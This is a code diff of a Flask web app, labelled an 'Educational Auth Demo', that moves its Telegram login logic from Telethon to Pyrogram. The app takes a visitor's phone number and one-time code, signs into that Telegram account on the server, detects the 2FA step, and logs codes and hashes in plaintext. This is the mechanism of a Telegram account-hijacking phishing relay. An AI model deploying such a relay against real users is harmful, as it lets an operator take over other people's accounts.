@@ -3,14 +3,13 @@ import asyncio
 import logging
 import time
 from flask import Flask, request, jsonify
-from telethon import TelegramClient
-from telethon.sessions import StringSession
-from telethon.errors import (
-    SessionPasswordNeededError, 
-    PhoneCodeInvalidError, 
-    PhoneNumberInvalidError, 
-    PhoneCodeExpiredError,
-    FloodWaitError
+from pyrogram import Client
+from pyrogram.errors import (
+    SessionPasswordNeeded, 
+    PhoneCodeInvalid, 
+    PhoneNumberInvalid, 
+    PhoneCodeExpired,
+    FloodWait
 )
 
 # Настройка логирования
@@ -68,7 +67,7 @@ class TelegramAuthTester:
             self.api_id = int(API_ID)
             self.api_hash = API_HASH
             self.initialized = True
-            logger.info(f"✅ Тестер аутентификации инициализирован с API_ID: {self.api_id}")
+            logger.info(f"✅ Pyrogram тестер инициализирован с API_ID: {self.api_id}")
             
         except ValueError as e:
             logger.error(f"❌ Неверный формат API_ID: {e}")
@@ -84,18 +83,20 @@ class TelegramAuthTester:
             
         client = None
         try:
-            # Создаем нового клиента
-            client = TelegramClient(
-                StringSession(),
-                self.api_id,
-                self.api_hash
+            # Создаем нового клиента Pyrogram
+            session_name = f"session_{int(time.time())}"
+            client = Client(
+                name=session_name,
+                api_id=self.api_id,
+                api_hash=self.api_hash,
+                in_memory=True  # Не сохраняем сессию на диск
             )
             
             await client.connect()
             
             # Запрашиваем код
             logger.info(f"📱 Запрос кода для: {phone_number}")
-            sent_code = await client.send_code_request(phone_number)
+            sent_code = await client.send_code(phone_number)
             
             # Сохраняем сессию
             session_id = f"{phone_number}_{int(time.time())}"
@@ -139,11 +140,11 @@ class TelegramAuthTester:
             logger.info(f"🔐 Верификация кода {code} для {phone}")
             logger.info(f"🔐 Используем phone_code_hash: {phone_code_hash}")
             
-            # Используем сохраненный phone_code_hash!
-            result = await client.sign_in(
-                phone=phone,
-                code=code,
-                phone_code_hash=phone_code_hash
+            # Входим с кодом
+            await client.sign_in(
+                phone_number=phone,
+                phone_code_hash=phone_code_hash,
+                phone_code=code
             )
             
             logger.info("✅ Успешная аутентификация")
@@ -154,11 +155,11 @@ class TelegramAuthTester:
             
             return {
                 'success': True,
-                'message': 'Аутентификация успешна',
+                'message': 'Аутентификация успешна!',
                 'is_test': True
             }
             
-        except SessionPasswordNeededError:
+        except SessionPasswordNeeded:
             logger.info("🔒 Требуется 2FA пароль")
             return {
                 'success': True,
@@ -166,23 +167,23 @@ class TelegramAuthTester:
                 'needs_password': True
             }
             
-        except PhoneCodeInvalidError as e:
+        except PhoneCodeInvalid as e:
             logger.warning(f"⚠️ Неверный код: {e}")
             return {'success': False, 'error': 'Неверный код подтверждения'}
             
-        except PhoneCodeExpiredError as e:
+        except PhoneCodeExpired as e:
             logger.warning(f"⏰ Код истек: {e}")
             await client.disconnect()
             del AUTH_SESSIONS[session_id]
             return {'success': False, 'error': 'Код истек. Запросите новый.'}
             
-        except FloodWaitError as e:
-            logger.warning(f"⏳ Flood wait: {e.seconds} секунд")
+        except FloodWait as e:
+            logger.warning(f"⏳ Flood wait: {e.value} секунд")
             await client.disconnect()
             del AUTH_SESSIONS[session_id]
             return {
                 'success': False, 
-                'error': f'Слишком много попыток. Попробуйте через {e.seconds} секунд.'
+                'error': f'Слишком много попыток. Попробуйте через {e.value} секунд.'
             }
             
         except Exception as e:
@@ -283,7 +284,7 @@ def educational_demo():
 </head>
 <body>
     <div class="container">
-        <h1>🔐 Educational Auth Demo</h1>
+        <h1>🔐 Educational Auth Demo (Pyrogram)</h1>
         <p>Демонстрация механизмов аутентификации (ТОЛЬКО ДЛЯ ОБРАЗОВАНИЯ)</p>
         
         <div class="status {status_color}">
@@ -298,7 +299,8 @@ def educational_demo():
             <strong>Отладочная информация:</strong><br>
             API_ID: {API_ID if API_ID else 'Не установлен'}<br>
             API_HASH: {'Установлен' if API_HASH else 'Не установлен'}<br>
-            Активные сессии: {len(AUTH_SESSIONS)}
+            Активные сессии: {len(AUTH_SESSIONS)}<br>
+            Библиотека: Pyrogram
         </div>
         
         <div id="step1">
@@ -490,7 +492,8 @@ def status():
         'api_initialized': auth_tester.initialized,
         'active_sessions': len(AUTH_SESSIONS),
         'api_id_set': bool(API_ID),
-        'api_hash_set': bool(API_HASH)
+        'api_hash_set': bool(API_HASH),
+        'library': 'Pyrogram'
     })
 
 if __name__ == '__main__':
